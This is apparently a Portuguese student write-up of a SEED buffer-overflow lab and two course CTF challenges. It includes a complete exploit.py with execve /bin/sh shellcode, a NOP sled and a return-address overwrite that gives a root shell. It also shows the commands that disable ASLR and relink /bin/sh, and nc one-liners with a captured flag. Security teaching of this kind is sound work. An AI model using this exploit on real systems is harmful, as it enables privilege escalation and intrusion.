# Task 1
Depois de compilar o código utilizando a makefile dada, são criados dois programas um a32.out e um a64.out, tornando possível inciar a shell em 32 bits ou em 64 bits. Ambos programas não apresentaram diferenças de execução visíveis. Sendo que os dois codigos apenas abrem uma shell sem permissões root.

![Task1](/Images/LB5T1.png)


# Task 2 
Foi executado o commando  "sudo sysctl -w kernel.randomize_va_space=0" desligando assim a aleatoriedade de memória para ter a certeza que o exploit funciona sempre. Caso a aleatoriedade seja ativada o nosso exploit passa a não funcionar sempre tendo uma probabilidade muito pequena de resultar (mas não nula).
Foi também executado o comando "sudo ln -sf /bin/zsh /bin/sh" para evitarmos usar o /bin/bash que têm proteções contra este tipo de ataque.

# Task 3
Para executarmos o buffer overflow precisamos de duas informações, a distância desde do início do buffer até ao nosso valor de retorno e um endereço de memória que corresponda ao início do nosso shellcode ou a uma instrução NOP anterior ao mesmo.

Para descobrirmos a distância entre o início do buffer e o valor de retorno basta subtrair o endereço de memória do base pointer ($ebp) ao início do buffer (&buffer) e somar 4, pois, o endereço de retorno encontra-se na stack 4 bytes acima do base pointer. Ao subtrair esses 2 valores obtemos 0x6C que corresponde a 108 em decimal, somando 4 obtemos 112 bytes de diferença.

![ValorReturno](/Images/LB5T3.png)

Como entre o valor de retorno e o shellcode só existem bytes preenchidos com a instrução NOP podemos adicionar um valor superior a 0x8 ao base pointer (para passar por cima do base pointer e do valor de retorno). Como fora do gdb as posições de memoria alteram ligeiramente foi dado 0x40 em vez de 0x8 para compensar (0xffffc828+0x40).

Criando o ficheiro badfile com o exploit.py e a seguir correndo ./stack-L1 obtemos uma shell com permissões root.

![shellroot](/Images/LB5T3_2.png)

exploit.py:
```
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
print(len(shellcode))
start = 517-len(shellcode)             # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffc828+0x40           # Change this number  0xffffc8ec
offset = 112            # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
print((ret).to_bytes(L,byteorder='little'))
#################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```


# CTF Desafio 1:

Inicialmente foi executado o comando 'checksec program' com o objetivo de analisar com que proteções é que o programa foi compilado.

![Desafio1](/Images/CTF5.1.jpg)

Podemos concluir que a arquitetura é x86(Arch), não existe um cannary a proteger o return address (Stack), a stack tem permisssão de execução (NX), e as posições do binário não estão randomizadas (PIE).

A seguir, ao analizarmos o código 'main.c',inicialmente o programa faz uma leitura de input com scanf de uma string com 28 caracteres

```
scanf("%28s", &buffer);
```

Continuando com a análise do código, foi aberto o ficheiro 'mem.txt' e dentro de um ciclo While, existe uma condição na qual é executado a função fgets(), que lê uma 20 caracteres da stream especificada 'fd' e a armazena na string 'buffer'. É possível perceber que existe uma diferença de 8 caracteres no buffer, ocasionando num buffer overflow. Desse modo, preenchendo a string com 20 caracteres arbitrários e seguido do ficheiro que queremos ler, no caso 'flag.txt', torna-se possível abrir o mesmo ao invés de 'mem.txt'.

![Desafio1.1](/Images/CTF5.1.1.png)


# CTF Desafio 2:

Inicialmente foi executado o comando 'checksec program' com o objetivo de analisar com que proteções é que o programa foi compilado.

![Desafio1](/Images/CTF5.2.jpg)

Foi possível verificar que as permissões encontram-se como no desafio 1.

A seguir, analisando o codigo 'main.c', é criada uma variavel char 'buffer[20]' e uma variavel char 'val[4]' = "\xef\xbe\xad\xde". Depois, é realizado um scanf que lerá 32 caracteres do input, assim, coloca-se quaisquer 20 caracteres para ocupar o buffer. A seguir no codigo, existe um if que será executado caso a variavel 'val' seja igual a 0xfefc2122. Desse modo, atribui-se \x22\x21\xfc\xfe no input após os os 20 caracteres inseridos, de modo a sobrescrever o valor em val e entrar no if. 
De maneira a sobrescrever o ficheiro a ser lido pelo programa, ainda no input inicial, após atribuir o novo valor a val, coloca-se 'flag.txt'. O input final será: "aaaaaaaaaaaaaaaaaaaa\x22\x21\xfc\xfeflag.txt"

Foi executado python2 -c 'print "aaaaaaaaaaaaaaaaaaaa\x22\x21\xfc\xfeflag.txt"' | nc ctf-fsi.fe.up.pt 4000 para obter o resultado final, resultando na flag: flag{2fb7cb6592c197b051f41541b3da6ab1}
